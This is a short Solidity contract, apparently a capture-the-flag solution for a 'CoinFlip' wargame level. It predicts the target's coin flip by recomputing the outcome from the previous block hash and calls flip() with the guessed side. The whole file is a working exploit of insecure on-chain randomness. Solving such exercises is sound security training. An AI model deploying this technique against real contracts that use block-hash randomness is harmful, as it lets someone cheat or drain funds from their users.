pragma solidity ^0.6.0;

import "./3-CoinFlip.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract CoinFlipAttack {
    uint256 lastHash;
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip coinFlipContract;

    constructor(address coinFlipAddress) public {
        coinFlipContract = CoinFlip(coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
